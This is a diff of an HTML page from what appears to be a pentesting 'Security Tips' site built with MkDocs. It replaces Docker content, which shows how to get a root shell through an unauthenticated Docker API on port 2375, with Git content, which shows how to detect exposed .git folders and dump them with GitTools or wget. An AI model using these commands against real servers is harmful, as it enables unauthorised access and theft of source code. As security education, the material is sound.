@@ -8,7 +8,7 @@
   
   
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>Docker - Security Tips</title>
+  <title>Git - Security Tips</title>
   <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>
 
   <link rel="stylesheet" href="../css/theme.css" type="text/css" />
@@ -17,8 +17,8 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Docker";
-    var mkdocs_page_input_path = "docker.md";
+    var mkdocs_page_name = "Git";
+    var mkdocs_page_input_path = "git.md";
     var mkdocs_page_url = null;
   </script>
   
@@ -67,21 +67,9 @@
 		
     <span class="caption-text">Containers</span>
     <ul class="subnav">
-                <li class=" current">
+                <li class="">
                     
-    <a class="current" href="./">Docker</a>
-    <ul class="subnav">
-            
-    <li class="toctree-l3"><a href="#docker">Docker</a></li>
-    
-        <ul>
-        
-            <li><a class="toctree-l4" href="#api">API</a></li>
-        
-        </ul>
-    
-
-    </ul>
+    <a class="" href="../docker/">Docker</a>
                 </li>
                 <li class="">
                     
@@ -144,9 +132,15 @@
                     
     <a class="" href="../graphql/">GraphQL</a>
                 </li>
-                <li class="">
+                <li class=" current">
                     
-    <a class="" href="../git/">Git</a>
+    <a class="current" href="./">Git</a>
+    <ul class="subnav">
+            
+    <li class="toctree-l3"><a href="#git">Git</a></li>
+    
+
+    </ul>
                 </li>
     </ul>
 	    </li>
@@ -215,11 +209,11 @@
     
       
         
-          <li>Containers &raquo;</li>
+          <li>Web &raquo;</li>
         
       
     
-    <li>Docker</li>
+    <li>Git</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -229,24 +223,20 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="docker">Docker</h1>
-<h2 id="api">API</h2>
-<p>The docker API expose the port <code>2375</code>. This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated.</p>
-<p>To confirm that the host is running Docker you can make a GET requests to <code>/version</code> :</p>
-<pre><code>http://&lt;host&gt;:&lt;port&gt;/version
-{&quot;Platform&quot;: {&quot;Name&quot;: &quot;&quot;}, &quot;Components&quot;: [{&quot;Name&quot;: &quot;Engine&quot;, &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;Details&quot;: {&quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;, &quot;Experimental&quot;: &quot;false&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;Os&quot;: &quot;linux&quot;}}], &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;Os&quot;: &quot;linux&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;}
+                <h1 id="git">Git</h1>
+<p>Some website exposes <code>.git</code> to the internet. To check if the website is vulnerable, then check for
+the following path:</p>
+<pre><code>https://&lt;domain&gt;/some/path/.git/HEAD
 </code></pre>
 
-<p>Then, using the CLI you can execute commands, for instance:</p>
-<pre><code>$ docker -H &lt;host&gt;:&lt;port&gt; ps
-
-CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
-be2dd8aa8222        ubuntu:14.04        &quot;bash&quot;              5 years ago         Up 2 seconds                            silly_elion
-
-$ docker -H &lt;host&gt;:&lt;port&gt; exec -it &lt;container_name&gt; /bin/bash
-root@abc:/# whoami
-root
+<p>If the server return a status 200, then it might be possible to clone the repository. For that, you
+can use (<code>GitTools</code>)[https://github.com/internetwache/GitTools): </p>
+<pre><code>Dumper/gitdumper.sh http://&lt;domain&gt;/some/path/.git/ ~/&lt;domain&gt;
+Extractor/extractor.sh ~/&lt;domain&gt; ~/&lt;domain&gt;_dump
 </code></pre>
+
+<p>If the script is not dumping the <code>.git</code> folder, then you can modify it. Sometimes, the <code>/.git/</code> path
+is a Directory Listing, then it's easier to dump using <code>wget</code>.</p>
               
             </div>
           </div>
@@ -254,10 +244,10 @@ root
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../kubernetes/" class="btn btn-neutral float-right" title="Kubernetes">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../configuration-review/" class="btn btn-neutral float-right" title="Configuration review">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../firefox/" class="btn btn-neutral" title="Firefox"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../graphql/" class="btn btn-neutral" title="GraphQL"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -283,10 +273,10 @@ root
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../firefox/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../graphql/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../kubernetes/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../configuration-review/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
